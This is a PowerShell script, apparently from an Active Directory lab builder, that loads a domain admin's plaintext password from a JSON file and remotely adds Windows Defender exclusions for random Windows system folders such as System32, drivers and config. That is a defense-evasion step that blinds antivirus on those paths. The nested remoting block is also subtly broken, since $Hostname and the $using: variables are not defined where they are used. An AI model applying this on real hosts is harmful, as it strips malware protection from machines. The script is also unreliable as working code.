param(
    [string]$Hostname,
    [string]$limit
)

 


    $percorsi = @(
    "C:\Program Files\",
    "C:\Program Files (x86)\",
    "C:\ProgramData\",
    "C:\Windows\",
    "C:\Windows\System32\",
    "C:\Windows\System32\drivers\",
    "C:\Windows\System32\config\",
    "C:\Windows\Fonts\",
    "C:\Windows\Temp\",
    "C:\Windows\Installer\",
    "C:\Windows\Microsoft.NET\",
    "C:\Windows\Microsoft.NET\Framework\",
    "C:\Windows\Microsoft.NET\Framework64\"
    )

	# AD INITIALIZATION
	# Define configuration file path
	$configPath = "AD_network.json"

	# Check configuration file path	
	if (-not (Test-Path -Path $configPath)) {
  	# Configuration file not found
  	throw "Configuration file not found. Check file path."  	
}

	# Load configuration file
	$config = Get-Content -Path $configPath -Raw | ConvertFrom-Json

	# Define the domain name

	# Define users limit
	$UsersLimit = $config.domain.usersLimit

	# Create credential object for the local admin and the domain admin
	$admin = New-Object System.Management.Automation.PSCredential -ArgumentList $($config.domain.admin), (ConvertTo-SecureString -String $config.domain.password -AsPlainText -Force)




    Invoke-Command -ComputerName $config.domain.dcip -Credential $admin -ScriptBlock {
    
        
        Invoke-Command -ComputerName $Hostname -ScriptBlock {
            for ($i = 0; $i -le $using:limit; $i++)
            {
                $randomElement = Get-Random -InputObject $using:percorsi
                New-Item -Path $randomElement -ItemType Directory | Out-Null
                Add-MpPreference -ExclusionPath $randomElement
            }
        }

    }
